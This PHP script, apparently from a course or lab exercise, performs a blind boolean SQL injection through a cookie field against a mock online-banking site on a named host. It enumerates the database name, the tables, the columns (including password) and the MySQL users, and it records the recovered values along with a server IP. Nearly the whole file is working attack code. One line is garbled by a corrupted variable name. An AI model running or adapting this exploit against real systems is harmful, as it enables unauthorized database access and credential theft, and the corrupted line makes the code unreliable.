<?php

define('TARGET_URL', "http://esidcf.alwaysdata.net/connected.php");
define('VALIDATION_TOKEN', 'Ma banque en ligne');
define('VERBOSE_MODE', true);

function getContent($url, $cookies) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_COOKIE, $cookies);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $res = curl_exec($curl);
    $return_code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    if($return_code != 200 && $return_code != 302){
        echo "Got an error retrieving $url with cookies [$cookies]. ".
                "Target URL returns HTTP code $return_code.\n";
    }
    curl_close($curl);
    return $res;
}

function request($token){
    $html_result = getContent(TARGET_URL, "connected=true; email=$token");
    return strpos($html_result, VALIDATION_TOKEN) !== false;
}

function replaceSpecialChar($char){
    if($char == "_" or $char == "%")
        return "\\".$char;
    return $char;
}

function NameContainsChar($chars_token, Array $request, $verbose = false, $char_pos = 0){
    if($char_pos < strlen($chars_token)){
        // test request with current char
        // get char
        $current_char = replaceSpecialChar($chars_token[$char_pos]);
        $token = $request[0] . "%" . $current_char . "%" . $request[1];
        if (request($token)){
            if($verbose)
                echo "Database char found : $current_char\n";
            return $current_char . NameContainsChar($chars_token, $request, $verbose, ++$char_pos);
        }else{
            return NameContainsChar($chars_token, $request, $verbose, ++$char_pos);
        }
    }else{
        return;
    }
}

function TableNameContainsChar($db_name, $chars_token, Array $request, $verbose = false, $char_pos = 0){
    if($char_pos < strlen($chars_token)){
        // test request with current char
        // get char
        $current_char = replaceSpecialChar($chars_token[$char_pos]);
        $token = $request[0] . $db_name . $request[1] . "%" . $current_char . "%" . $request[2];
        if (request($token)){
            if($verbose)
                echo "Table char found : $current_char\n";
            return $current_char . TableNameContainsChar($db_name, $chars_token, $request, $verbose, ++$char_pos);
        }else{
            return TableNameContainsChar($db_name, $chars_token, $request, $verbose, ++$char_pos);
        }
    }else{
        return;
    }
}

function discoverName($chars_token, Array $request, $verbose = false, $current_chars_token = ""){
    /**
     * tester toutes les lettres possible avec $current_chars_token = "" pour commencer
     * si on trouve une réponse, on récursive avec le token trouvé et on recommence
     * la tentative avec char pos à 0 
     * sinon on passe à char pos suivant et on garde le current_chars_token à current
     * /!\ pour tester si il reste encore un caractère à découvrir : $token%$char%
     * => boucler sur char, si pas de résultat : $token est complet
     */
    if(strlen($current_chars_token) < 20){
        for($i=0; $i<strlen($chars_token); $i++){
            $current_chars_token_temp = $current_chars_token . replaceSpecialChar($chars_token[$i]);
            $token = $request[0] . $current_chars_token_temp . "%". $request[1];
            if(request($token)){
                if($verbose)
                    echo "Middle token found : $current_chars_token_temp\n";
                $token = $request[0] . $current_chars_token_temp . $request[1];
                if(request($token)){
                    echo "Token found : $current_chars_token_temp\n";
                }
                discoverName ($chars_token, $request, $verbose, $current_chars_token_temp);
            }
        }
    }
}

function discoverTableName($db_name, $chars_token, Array $request, $verbose = false, $current_chars_token = ""){
    /**
     * tester toutes les lettres possible avec $current_chars_token = "" pour commencer
     * si on trouve une réponse, on récursive avec le token trouvé et on recommence
     * la tentative avec char pos à 0 
     * sinon on passe à char pos suivant et on garde le current_chars_token à current
     * /!\ pour tester si il reste encore un caractère à découvrir : $token%$char%
     * => boucler sur char, si pas de résultat : $token est complet
     */
    if(strlen($current_chars_token) < 20){
        for($i=0; $i<strlen($chars_token); $i++){
            $current_chars_token_temp = $current_chars_token . replaceSpecialChar($chars_token[$i]);
            $token = $request[0] . $db_name . $request[1] . $current_chars_token_temp . "%". $request[2];
            if(request($token)){
                if($verbose)
                    echo "Middle token found : $current_chars_token_temp\n";
                $token = $request[0] . $db_name . $request[1] . $current_chars_token_temp . $request[2];
                if(request($token)){
                    echo "Token found : $current_chars_token_temp\n";
                }
                discoverTableName ($db_name, $chars_token, $request, $verbose, $current_chars_token_temp);
            }
        }
    }
}

function ColumnNameContainsChar($db_name, $table_name, $chars_token, Array $request, $verbose = false, $char_pos = 0){
    if($char_pos < strlen($chars_token)){
        // test request with current char
        // get char
        $current_char = replaceSpecialChar($chars_token[$char_pos]);
        $token = $request[0] . $db_name . $request[1] . $table_name . $request[2] . "%" . $current_char . "%" . $request[3];
        if (request($token)){
            if($verbose)
                echo "Column char found : $current_char\n";
            return $current_char . ColumnNameContainsChar($db_name, $table_name, $chars_token, $request, $verbose, ++$char_pos);
        }else{
            return ColumnNameContainsChar($db_name, $table_name, $chars_token, $request, $verbose, ++$char_pos);
        }
    }else{
        return;
    }
}

function discoverColumnName($db_name, $table_name, $chars_token, Array $request, $verbose = false, $current_chars_token = ""){
    if(strlen($current_chars_token) < 20){
        for($i=0; $i<strlen($chars_token); $i++){
            $current_chars_token_temp = $current_chars_token . replaceSpecialChar($chars_token[$i]);
            $token = $request[0] . $db_name . $request[1] . $table_name . $request[2] . $current_chars_token_temp . "%". $request[3];
            if(request($token)){
                if($verbose)
                    echo "Middle token found : $current_chars_token_temp\n";
                $token = $request[0] . $db_name . $request[1] . $table_name . $request[2] . $current_chars_token_temp . $request[3];
                if(request($token)){
                    echo "Token found : $current_chars_token_temp\n";
                }
                discoverColumnName ($db_name, $table_name, $chars_token, $request, $verbose, $current_chars_token_temp);
            }
        }
    }
}

function countTable($DB_name, Array $request, $verbose = false, $count = 0){
    $token = $request[0] . $DB_name . $request[1] . $count . " " . $request[2];
    if(request($token)){
        return $count;
    }else{
        return countTable($DB_name, $request, $verbose, ++$count);
    }
}

/**
 * $tokens should be :
 * ASCII: [0-9,a-z,A-Z$_] (basic Latin letters, digits 0-9, dollar, underscore)
 * Extended: U+0080 .. U+FFFF
 * 
 * But can also be :
 * ASCII: U+0001 .. U+007F
 * Extended: U+0080 .. U+FFFF
 * 
 * more info : http://dev.mysql.com/doc/refman/5.0/en/identifiers.html
 * 
 * queries available here : http://sqlzoo.net/hack/index.html
 */
$chars_token = "abcdefghijklmnopqrstuvwxyz0123456789@\$_- []=<>?*#!$%.";

// ' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE 'esi_cf_m_ba_k') AND ''='
$database_name_request = Array(
    "' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '",
    "') AND ''='"
);

// ' OR (SELECT count(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '<db name>' AND TABLE_NAME LIKE '%')=<number of table> AND ''='
$number_of_table = Array(
    "' OR (SELECT count(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '",
    "' AND TABLE_NAME LIKE '%')=",
    "AND ''='"
);

// ' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '<db name>' AND TABLE_NAME LIKE '<table name>') AND ''='
$table_name_request = Array(
    "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '",
    "' AND TABLE_NAME LIKE '",
    "') AND ''='"
);

// ' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE '<db name>' AND TABLE_NAME LIKE '<table name>' AND COLUMN_NAME LIKE '<col name>') AND ''='
$column_name_request = Array(
    "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE '",
    "' AND TABLE_NAME LIKE '",
    "' AND COLUMN_NAME LIKE '",
    "') AND ''='"
);

$current_user_request = Array(
    "' OR EXISTS(SELECT 1 FROM dual WHERE CURRENT_USER() LIKE '",
    "') AND ''='"
);
        
$session_user_request = Array(
    "' OR EXISTS(SELECT 1 FROM dual WHERE SESSION_USER() LIKE '",
    "') AND ''='"
);

NameContainsChar($chars_token, $database_name_request, VERBOSE_MODE);
$chars_db_token = "abcdefikmnsy_";
discoverName($chars_db_token, $database_name_request, VERBOSE_MODE);
$db_name = "esidcf_mybank";
countTable($db_name, $number_of_table, VERBOSE_MODE);
$number_of_table = 1;
TableNameContainsChar($db_name, $chars_token, $table_name_request, VERBOSE_MODE);
$chars_table_token = "ersu";
discoverTableName($db_name, $chars_table_token, $table_name_request, VERBOSE_MODE);
$table_name = "users";
ColumnNameContainsChar($db_name, $table_name, $chars_token, $column_name_request, VERBOSE_MODE);
$chars_column_token = "acdeilmnoprstuw";
discoverColumnName($db_name, $table_name, $chars_column_token, $column_name_request, VERBOSE_MODE);
$column_name = Array("account", "email", "id", "password");


NameContainsChar($chars_token, $current_user_request, VERBOSE_MODE);
$chars_current_user_token = "cdefis@%";
discoverName($charséééééééééééééééé_user_token, $current_user_request, VERBOSE_MODE);
$current_user = "esidcf@%";
NameContainsChar($chars_token, $session_user_request, VERBOSE_MODE);
$chars_session_user_token = "cdefis012378@.";
discoverName($chars_session_user_token, $session_user_request, VERBOSE_MODE);
$session_user = "esidcf@178.32.28.120";